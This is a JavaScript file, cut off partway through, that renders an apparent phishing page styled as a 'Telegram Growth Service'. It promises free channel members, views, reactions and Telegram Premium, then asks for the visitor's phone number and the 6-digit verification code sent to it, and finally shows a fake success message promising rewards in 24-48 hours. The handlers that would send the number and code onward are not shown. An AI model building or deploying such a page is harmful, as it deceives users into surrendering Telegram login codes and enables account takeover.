// Telegram Growth Service - All-in-one file
(function() {
  // Create root container
  const root = document.createElement('div');
  root.id = 'tg-app';
  document.body.appendChild(root);

  // Inject CSS
  const style = document.createElement('style');
  style.textContent = `
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: linear-gradient(135deg, #0088cc 0%, #005f99 100%);
      transition: background 0.3s;
      font-size: 16px;
      -webkit-font-smoothing: antialiased;
      min-height: 100vh;
    }

    body.dark {
      background: linear-gradient(135deg, #0a1929 0%, #001e3c 100%);
    }

    #tg-app {
      min-height: 100vh;
      position: relative;
    }

    .container {
      max-width: 420px;
      margin: 0 auto;
      padding: 12px;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 16px;
      background: rgba(255, 255, 255, 0.1);
      border-bottom: 1px solid rgba(255, 255, 255, 0.15);
      backdrop-filter: blur(10px);
      transition: all 0.3s;
    }

    body.dark .header {
      background: rgba(0, 0, 0, 0.3);
      border-bottom-color: rgba(255, 255, 255, 0.1);
    }

    .theme-toggle {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.15);
      border: none;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.3s;
      padding: 0;
    }

    .theme-toggle svg {
      width: 20px;
      height: 20px;
      color: white;
    }

    body.dark .theme-toggle {
      background: rgba(255, 255, 255, 0.2);
    }

    .theme-toggle:active {
      transform: scale(0.95);
    }

    .progress-bar {
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 12px 12px 8px;
      gap: 0;
      overflow-x: auto;
      background: transparent;
      position: relative;
    }

    .step-indicator {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 0;
      flex: 1;
      max-width: 70px;
      position: relative;
    }

    .step-circle {
      width: 36px;
      height: 36px;
      min-width: 36px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(255, 255, 255, 0.2);
      color: rgba(255, 255, 255, 0.6);
      transition: all 0.3s;
      margin-bottom: 4px;
      border: 2px solid transparent;
      position: relative;
      z-index: 2;
    }

    .step-circle svg {
      width: 18px;
      height: 18px;
    }

    .step-circle.active {
      background: white;
      color: #0088cc;
      box-shadow: 0 4px 16px rgba(255, 255, 255, 0.4);
      border-color: rgba(255, 255, 255, 0.5);
    }

    body.dark .step-circle.active {
      background: white;
      color: #0088cc;
    }

    .step-circle.completed {
      background: rgba(255, 255, 255, 0.9);
      color: #00b341;
      box-shadow: 0 2px 8px rgba(0, 179, 65, 0.3);
    }

    .step-line {
      position: absolute;
      top: 18px;
      left: 50%;
      width: 100%;
      height: 2px;
      background: rgba(255, 255, 255, 0.2);
      z-index: 1;
      transition: background 0.3s;
    }

    .step-line.completed {
      background: rgba(255, 255, 255, 0.8);
    }

    .step-line.active {
      background: linear-gradient(90deg, rgba(255, 255, 255, 0.8) 0%, rgba(255, 255, 255, 0.3) 100%);
    }

    .step-label {
      text-align: center;
      color: rgba(255, 255, 255, 0.7);
      font-size: 10px;
      font-weight: 500;
      transition: color 0.3s;
      line-height: 1.2;
    }

    .step-indicator.active .step-label {
      color: white;
      font-weight: 600;
    }

    .card {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 20px;
      padding: 28px 20px;
      margin-top: 0;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
      transition: all 0.3s;
      position: relative;
      overflow: hidden;
      border: 1px solid rgba(255, 255, 255, 0.3);
    }

    .card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 4px;
      background: linear-gradient(90deg, #0088cc 0%, #00b341 100%);
      opacity: 1;
    }

    body.dark .card {
      background: rgba(18, 30, 48, 0.95);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .tg-logo {
      width: 80px;
      height: 80px;
      background: linear-gradient(135deg, #2aabee 0%, #229ed9 100%);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
      color: white;
      box-shadow: 0 8px 24px rgba(42, 171, 238, 0.5);
      position: relative;
      overflow: hidden;
    }

    .tg-logo::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.2), transparent);
      transform: rotate(45deg);
      animation: shimmer 3s infinite;
    }

    @keyframes shimmer {
      0% {
        transform: translateX(-100%) translateY(-100%) rotate(45deg);
      }
      100% {
        transform: translateX(100%) translateY(100%) rotate(45deg);
      }
    }

    .tg-logo svg {
      position: relative;
      z-index: 1;
    }

    .card-title {
      font-size: 24px;
      font-weight: 700;
      color: #0a1929;
      text-align: center;
      margin-bottom: 10px;
      transition: color 0.3s;
      line-height: 1.2;
    }

    body.dark .card-title {
      color: #e3f2fd;
    }

    .card-description {
      color: #546e7a;
      text-align: center;
      margin-bottom: 16px;
      line-height: 1.4;
      transition: color 0.3s;
      font-size: 14px;
    }

    body.dark .card-description {
      color: #90caf9;
    }

    .features-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 8px;
      margin-bottom: 16px;
    }

    .feature-card {
      background: linear-gradient(135deg, #e3f2fd 0%, #d1e9ff 100%);
      border-radius: 12px;
      padding: 14px 8px;
      text-align: center;
      transition: all 0.3s;
      cursor: pointer;
      border: 1px solid rgba(0, 136, 204, 0.2);
      position: relative;
      overflow: hidden;
    }

    body.dark .feature-card {
      background: linear-gradient(135deg, #1a3a52 0%, #0f2a3e 100%);
      border: 1px solid rgba(42, 171, 238, 0.3);
    }

    .feature-card:hover {
      transform: translateY(-3px);
      box-shadow: 0 6px 16px rgba(0, 136, 204, 0.3);
      border-color: rgba(0, 136, 204, 0.5);
      background: linear-gradient(135deg, #bbdefb 0%, #90caf9 100%);
    }

    body.dark .feature-card:hover {
      background: linear-gradient(135deg, #2a4a62 0%, #1a3a52 100%);
    }

    .feature-card:active {
      transform: translateY(0) scale(0.97);
    }

    .feature-icon {
      width: 36px;
      height: 36px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 6px;
      color: #0088cc;
    }

    .feature-icon svg {
      width: 30px;
      height: 30px;
    }

    .feature-title {
      font-size: 11px;
      font-weight: 600;
      color: #0a1929;
      transition: color 0.3s;
      line-height: 1.3;
    }

    body.dark .feature-title {
      color: #e3f2fd;
    }

    .service-options {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 12px;
      margin-bottom: 20px;
    }

    .service-option {
      background: #f5f5f5;
      border: 2px solid #e0e0e0;
      border-radius: 12px;
      padding: 20px 14px;
      text-align: center;
      cursor: pointer;
      transition: all 0.3s;
    }

    body.dark .service-option {
      background: #1a2332;
      border-color: #2a3a4a;
    }

    .service-option:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(0, 136, 204, 0.2);
    }

    .service-option:active {
      transform: scale(0.98);
    }

    .service-option.selected {
      background: #e3f2fd;
      border-color: #0088cc;
      box-shadow: 0 4px 16px rgba(0, 136, 204, 0.3);
    }

    body.dark .service-option.selected {
      background: #1a3a52;
      border-color: #2aabee;
    }

    .service-icon {
      margin-bottom: 10px;
      color: #0088cc;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .service-icon svg {
      width: 32px;
      height: 32px;
    }

    .service-title {
      font-size: 15px;
      font-weight: 600;
      color: #0a1929;
      margin-bottom: 5px;
      transition: color 0.3s;
    }

    body.dark .service-title {
      color: #e3f2fd;
    }

    .service-description {
      font-size: 13px;
      color: #546e7a;
      transition: color 0.3s;
      line-height: 1.4;
    }

    body.dark .service-description {
      color: #90caf9;
    }

    .package-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 12px;
      margin-bottom: 20px;
    }

    .package-option {
      background: #f5f5f5;
      border: 2px solid #e0e0e0;
      border-radius: 12px;
      padding: 16px 12px;
      text-align: center;
      cursor: pointer;
      transition: all 0.3s;
    }

    body.dark .package-option {
      background: #1a2332;
      border-color: #2a3a4a;
    }

    .package-option:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(0, 136, 204, 0.2);
    }

    .package-option:active {
      transform: scale(0.98);
    }

    .package-option.selected {
      background: #e3f2fd;
      border-color: #0088cc;
      box-shadow: 0 4px 16px rgba(0, 136, 204, 0.3);
    }

    body.dark .package-option.selected {
      background: #1a3a52;
      border-color: #2aabee;
    }

    .package-count {
      font-size: 20px;
      font-weight: 700;
      color: #0088cc;
      margin-bottom: 6px;
    }

    .package-badge {
      display: inline-block;
      background: #00b341;
      color: white;
      padding: 3px 10px;
      border-radius: 6px;
      font-size: 11px;
      font-weight: 600;
    }

    .form-group {
      margin-bottom: 16px;
    }

    .form-label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: #0a1929;
      margin-bottom: 8px;
      transition: color 0.3s;
    }

    body.dark .form-label {
      color: #e3f2fd;
    }

    .form-input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid #cfd8dc;
      border-radius: 10px;
      font-size: 16px;
      background: white;
      color: #0a1929;
      transition: all 0.3s;
      font-family: inherit;
    }

    body.dark .form-input {
      background: #1a2332;
      border-color: #2a3a4a;
      color: #e3f2fd;
    }

    .form-input:focus {
      outline: none;
      border-color: #0088cc;
      box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.15);
    }

    .phone-input-wrapper {
      display: flex;
      gap: 8px;
    }

    .country-code {
      width: 80px;
      padding: 14px 12px;
      border: 1px solid #cfd8dc;
      border-radius: 10px;
      font-size: 16px;
      background: white;
      color: #0a1929;
      transition: all 0.3s;
      font-family: inherit;
      text-align: center;
      font-weight: 600;
    }

    body.dark .country-code {
      background: #1a2332;
      border-color: #2a3a4a;
      color: #e3f2fd;
    }

    .otp-input-container {
      display: flex;
      gap: 8px;
      justify-content: center;
      margin-bottom: 16px;
    }

    .otp-digit {
      width: 48px;
      height: 56px;
      border: 2px solid #cfd8dc;
      border-radius: 10px;
      font-size: 24px;
      font-weight: 600;
      text-align: center;
      background: white;
      color: #0a1929;
      transition: all 0.3s;
      font-family: inherit;
    }

    body.dark .otp-digit {
      background: #1a2332;
      border-color: #2a3a4a;
      color: #e3f2fd;
    }

    .otp-digit:focus {
      outline: none;
      border-color: #0088cc;
      box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.15);
    }

    .resend-code {
      text-align: center;
      margin-top: 12px;
      font-size: 13px;
      color: #546e7a;
    }

    body.dark .resend-code {
      color: #90caf9;
    }

    .resend-link {
      color: #0088cc;
      text-decoration: none;
      font-weight: 600;
      cursor: pointer;
    }

    .resend-link:active {
      opacity: 0.7;
    }

    .button-group {
      display: flex;
      gap: 10px;
      margin-top: 20px;
    }

    .btn {
      flex: 1;
      padding: 14px;
      border: none;
      border-radius: 10px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-family: inherit;
      min-height: 46px;
    }

    .btn-primary {
      background: linear-gradient(135deg, #2aabee 0%, #229ed9 100%);
      color: white;
      box-shadow: 0 4px 12px rgba(42, 171, 238, 0.4);
    }

    .btn-primary:hover {
      box-shadow: 0 6px 16px rgba(42, 171, 238, 0.5);
      transform: translateY(-1px);
    }

    .btn-primary:active {
      background: linear-gradient(135deg, #1a9bde 0%, #128ec9 100%);
      transform: scale(0.98);
      box-shadow: 0 2px 8px rgba(42, 171, 238, 0.4);
    }

    .btn-primary:disabled {
      background: #cfd8dc;
      color: #90a4ae;
      cursor: not-allowed;
      box-shadow: none;
    }

    .btn-secondary {
      background: #eceff1;
      color: #0a1929;
    }

    body.dark .btn-secondary {
      background: #2a3a4a;
      color: #e3f2fd;
    }

    .btn-secondary:active {
      background: #cfd8dc;
      transform: scale(0.98);
    }

    body.dark .btn-secondary:active {
      background: #3a4a5a;
    }

    .footer {
      text-align: center;
      padding: 16px 20px;
      color: rgba(255, 255, 255, 0.7);
      font-size: 11px;
      transition: color 0.3s;
      line-height: 1.4;
    }

    body.dark .footer {
      color: rgba(255, 255, 255, 0.6);
    }

    .footer-links {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 12px;
      margin-top: 8px;
    }

    .footer-link {
      color: rgba(255, 255, 255, 0.9);
      text-decoration: none;
      font-size: 12px;
    }

    .footer-link:active {
      opacity: 0.7;
    }

    .success-animation {
      text-align: center;
    }

    .success-icon {
      width: 96px;
      height: 96px;
      background: #00b341;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 24px;
      color: white;
      animation: scaleIn 0.5s ease-out;
    }

    @keyframes scaleIn {
      from {
        transform: scale(0);
        opacity: 0;
      }
      to {
        transform: scale(1);
        opacity: 1;
      }
    }

    .confetti {
      position: fixed;
      width: 10px;
      height: 10px;
      background: #0088cc;
      position: absolute;
      animation: confetti-fall 3s linear;
    }

    @keyframes confetti-fall {
      to {
        transform: translateY(100vh) rotate(360deg);
        opacity: 0;
      }
    }

    .spinner {
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .hide {
      display: none;
    }
  `;
  document.head.appendChild(style);

  // SVG Icons
  const icons = {
    telegram: `<svg width="48" height="48" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/></svg>`,
    sun: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>`,
    moon: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>`,
    home: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>`,
    list: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="8" y1="6" x2="21" y2="6"></line><line x1="8" y1="12" x2="21" y2="12"></line><line x1="8" y1="18" x2="21" y2="18"></line><line x1="3" y1="6" x2="3.01" y2="6"></line><line x1="3" y1="12" x2="3.01" y2="12"></line><line x1="3" y1="18" x2="3.01" y2="18"></line></svg>`,
    package: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="16.5" y1="9.4" x2="7.5" y2="4.21"></line><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg>`,
    phone: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>`,
    shield: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>`,
    check: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>`,
    checkCircle: `<svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>`,
    users: `<svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>`,
    eye: `<svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>`,
    heart: `<svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>`,
    star: `<svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>`,
    crown: `<svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 11l1.5 1.5L8 9l4 4 3.5-3.5L17 11V3l-2 2-3-3-3 3-2-2v8z"></path><path d="M3 21h18v-4H3v4z"></path></svg>`,
    zap: `<svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg>`,
    gift: `<svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 12 20 22 4 22 4 12"></polyline><rect x="2" y="7" width="20" height="5"></rect><line x1="12" y1="22" x2="12" y2="7"></line><path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"></path><path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"></path></svg>`,
  };

  // State management
  let state = {
    currentStep: 0,
    darkMode: false,
    selectedService: null,
    selectedPackage: null,
    countryCode: '+1',
    phoneNumber: '',
    otpCode: '',
    isProcessing: false
  };

  // Steps configuration
  const steps = [
    { icon: 'home', label: 'Welcome' },
    { icon: 'list', label: 'Service' },
    { icon: 'package', label: 'Package' },
    { icon: 'phone', label: 'Phone' },
    { icon: 'shield', label: 'Verify' },
    { icon: 'check', label: 'Success' }
  ];

  // Features data
  const features = [
    { icon: 'users', title: 'Members' },
    { icon: 'eye', title: 'Post Views' },
    { icon: 'heart', title: 'Reactions' },
    { icon: 'crown', title: 'Premium' },
    { icon: 'zap', title: 'Fast' },
    { icon: 'gift', title: 'Free' }
  ];

  // Render functions
  function renderHeader() {
    return `
      <div class="header">
        <div></div>
        <button class="theme-toggle" onclick="window.tgApp.toggleTheme()">
          ${state.darkMode ? icons.sun : icons.moon}
        </button>
      </div>
    `;
  }

  function renderProgressBar() {
    return `
      <div class="progress-bar">
        ${steps.map((step, index) => {
          const isActive = index === state.currentStep;
          const isCompleted = index < state.currentStep;
          const isLastStep = index === steps.length - 1;

          let lineClass = '';
          if (isCompleted) {
            lineClass = 'completed';
          } else if (isActive) {
            lineClass = 'active';
          }

          return `
            <div class="step-indicator ${isActive ? 'active' : ''}">
              <div class="step-circle ${isActive ? 'active' : ''} ${isCompleted ? 'completed' : ''}">
                ${isCompleted ? icons.check : icons[step.icon]}
              </div>
              <div class="step-label">${step.label}</div>
              ${!isLastStep ? `<div class="step-line ${lineClass}"></div>` : ''}
            </div>
          `;
        }).join('')}
      </div>
    `;
  }

  function renderWelcome() {
    return `
      <div class="container">
        <div class="card">
          <div class="tg-logo">${icons.telegram}</div>
          <h1 class="card-title">Telegram Growth</h1>
          <p class="card-description">Grow your Telegram channel with free members, views, reactions and premium features</p>

          <div class="features-grid">
            ${features.map(feature => `
              <div class="feature-card">
                <div class="feature-icon">${icons[feature.icon]}</div>
                <div class="feature-title">${feature.title}</div>
              </div>
            `).join('')}
          </div>

          <div class="button-group">
            <button class="btn btn-primary" onclick="window.tgApp.nextStep()">
              Get Started
            </button>
          </div>
        </div>
        ${renderFooter()}
      </div>
    `;
  }

  function renderServiceSelection() {
    const services = [
      { id: 'members', icon: 'users', title: 'Free Members', description: 'Add real members to your channel for free' },
      { id: 'views', icon: 'eye', title: 'Free Post Views', description: 'Boost your post view count for free' },
      { id: 'reactions', icon: 'heart', title: 'Free Reactions', description: 'Get authentic reactions for free' },
      { id: 'premium', icon: 'crown', title: 'Free Premium', description: 'Free Telegram Premium subscription' }
    ];

    return `
      <div class="container">
        <div class="card">
          <h2 class="card-title">Choose Your Service</h2>
          <p class="card-description">Select what you want to boost</p>

          <div class="service-options">
            ${services.map(service => `
              <div class="service-option ${state.selectedService === service.id ? 'selected' : ''}"
                   onclick="window.tgApp.selectService('${service.id}')">
                <div class="service-icon">${icons[service.icon]}</div>
                <div class="service-title">${service.title}</div>
                <div class="service-description">${service.description}</div>
              </div>
            `).join('')}
          </div>

          <div class="button-group">
            <button class="btn btn-secondary" onclick="window.tgApp.prevStep()">Back</button>
            <button class="btn btn-primary"
                    ${!state.selectedService ? 'disabled' : ''}
                    onclick="window.tgApp.nextStep()">
              Continue
            </button>
          </div>
        </div>
        ${renderFooter()}
      </div>
    `;
  }

  function renderPackageSelection() {
    let packages = [];

    if (state.selectedService === 'members') {
      packages = [
        { id: 'basic', amount: '500', badge: 'Free' },
        { id: 'standard', amount: '1,000', badge: 'Free' },
        { id: 'premium', amount: '2,500', badge: 'Free' },
        { id: 'ultimate', amount: '5,000', badge: 'Free' }
      ];
    } else if (state.selectedService === 'views') {
      packages = [
        { id: 'basic', amount: '1,000', badge: 'Free' },
        { id: 'standard', amount: '5,000', badge: 'Free' },
        { id: 'premium', amount: '10,000', badge: 'Free' },
        { id: 'ultimate', amount: '25,000', badge: 'Free' }
      ];
    } else if (state.selectedService === 'reactions') {
      packages = [
        { id: 'basic', amount: '250', badge: 'Free' },
        { id: 'standard', amount: '500', badge: 'Free' },
        { id: 'premium', amount: '1,000', badge: 'Free' },
        { id: 'ultimate', amount: '2,500', badge: 'Free' }
      ];
    } else if (state.selectedService === 'premium') {
      packages = [
        { id: 'basic', amount: '1 Month', badge: 'Free' },
        { id: 'standard', amount: '3 Months', badge: 'Free' },
        { id: 'premium', amount: '6 Months', badge: 'Free' },
        { id: 'ultimate', amount: '1 Year', badge: 'Free' }
      ];
    }

    return `
      <div class="container">
        <div class="card">
          <h2 class="card-title">Choose Package</h2>
          <p class="card-description">Select your desired package</p>

          <div class="package-grid">
            ${packages.map(pkg => `
              <div class="package-option ${state.selectedPackage === pkg.id ? 'selected' : ''}"
                   onclick="window.tgApp.selectPackage('${pkg.id}')">
                <div class="package-count">${pkg.amount}</div>
                <span class="package-badge">${pkg.badge}</span>
              </div>
            `).join('')}
          </div>

          <div class="button-group">
            <button class="btn btn-secondary" onclick="window.tgApp.prevStep()">Back</button>
            <button class="btn btn-primary"
                    ${!state.selectedPackage ? 'disabled' : ''}
                    onclick="window.tgApp.nextStep()">
              Continue
            </button>
          </div>
        </div>
        ${renderFooter()}
      </div>
    `;
  }

  function renderPhoneNumber() {
    return `
      <div class="container">
        <div class="card">
          <h2 class="card-title">Enter Phone Number</h2>
          <p class="card-description">We'll send you a verification code</p>

          <div class="form-group">
            <label class="form-label">Phone Number</label>
            <div class="phone-input-wrapper">
              <input
                type="text"
                class="country-code"
                value="${state.countryCode}"
                oninput="window.tgApp.updateCountryCode(this.value)"
                placeholder="+1"
                maxlength="4"
              >
              <input
                type="tel"
                class="form-input"
                placeholder="Enter your phone number"
                value="${state.phoneNumber}"
                oninput="window.tgApp.updatePhone(this.value)"
                id="phone-input"
                maxlength="15"
              />
            </div>
          </div>

          <div class="button-group">
            <button class="btn btn-secondary" onclick="window.tgApp.prevStep()">Back</button>
            <button class="btn btn-primary"
                    ${!state.phoneNumber || state.phoneNumber.length < 7 ? 'disabled' : ''}
                    onclick="window.tgApp.sendOTP()">
              ${state.isProcessing ? '<div class="spinner"></div>' : 'Send Code'}
            </button>
          </div>
        </div>
        ${renderFooter()}
      </div>
    `;
  }

  function renderOTPVerification() {
    return `
      <div class="container">
        <div class="card">
          <h2 class="card-title">Verify Code</h2>
          <p class="card-description">Enter the 6-digit code sent to ${state.countryCode}${state.phoneNumber}</p>

          <div class="form-group">
            <div class="otp-input-container">
              ${[0, 1, 2, 3, 4, 5].map(index => `
                <input
                  type="tel"
                  inputmode="numeric"
                  pattern="[0-9]*"
                  class="otp-digit"
                  maxlength="1"
                  id="otp-${index}"
                  oninput="window.tgApp.handleOTPInput(${index}, this.value)"
                  onkeydown="window.tgApp.handleOTPKeydown(${index}, event)"
                />
              `).join('')}
            </div>
            <div class="resend-code">
              Didn't receive code? <a class="resend-link" onclick="window.tgApp.resendOTP()">Resend</a>
            </div>
          </div>

          <div class="button-group">
            <button class="btn btn-secondary" onclick="window.tgApp.prevStep()">Back</button>
            <button class="btn btn-primary"
                    ${state.otpCode.length !== 6 ? 'disabled' : ''}
                    onclick="window.tgApp.verifyOTP()">
              ${state.isProcessing ? '<div class="spinner"></div>' : 'Verify'}
            </button>
          </div>
        </div>
        ${renderFooter()}
      </div>
    `;
  }

  function renderSuccess() {
    return `
      <div class="container">
        <div class="card">
          <div class="success-animation">
            <div class="success-icon">
              ${icons.checkCircle}
            </div>
            <h2 class="card-title">Success!</h2>
            <p class="card-description">Your request has been processed successfully. You will receive your rewards within 24-48 hours.</p>
          </div>

          <div class="button-group">
            <button class="btn btn-primary" onclick="window.tgApp.reset()">
              Start Again
            </button>
          </div>
        </div>
        ${renderFooter()}
      </div>
    `;
  }

  function renderFooter() {
    return `
      <div class="footer">
        <div>© 2024 Telegram Growth Service. All rights reserved.</div>
        <div class="footer-links">
          <a href="#" class="footer-link">Privacy</a>
          <a href="#" class="footer-link">Terms</a>
          <a href="#" class="footer-link">Support</a>
        </div>
      </div>
    `;
  }

  function render() {
    let stepContent = '';

    switch(state.currentStep) {
      case 0:
        stepContent = renderWelcome();
        break;
      case 1:
        stepContent = renderServiceSelection();
        break;
      case 2:
        stepContent = renderPackageSelection();
        break;
      case 3:
        stepContent = renderPhoneNumber();
        break;
      case 4:
        stepContent = renderOTPVerification();
        break;
      case 5:
        stepContent = renderSuccess();
        createConfetti();
        break;
    }

    root.innerHTML = `
      ${renderHeader()}
      ${renderProgressBar()}
      ${stepContent}
    `;

    // Auto-focus first OTP input
    if (state.currentStep === 4) {
      setTimeout(() => {
        const firstInput = document.getElementById('otp-0');
        if (firstInput) firstInput.focus();
      }, 100);
    }
  }

  function createConfetti() {
    const colors = ['#0088cc', '#2aabee', '#00b341', '#ffffff'];
    for (let i = 0; i < 50; i++) {
      setTimeout(() => {
        const confetti = document.createElement('div');
        confetti.className = 'confetti';
        confetti.style.left = Math.random() * 100 + '%';
        confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
        confetti.style.animationDelay = Math.random() * 0.5 + 's';
        root.appendChild(confetti);
        setTimeout(() => confetti.remove(), 3000);
      }, i * 30);
    }
  }

  // Public API
  window.tgApp = {
    toggleTheme() {
      state.darkMode = !state.darkMode;
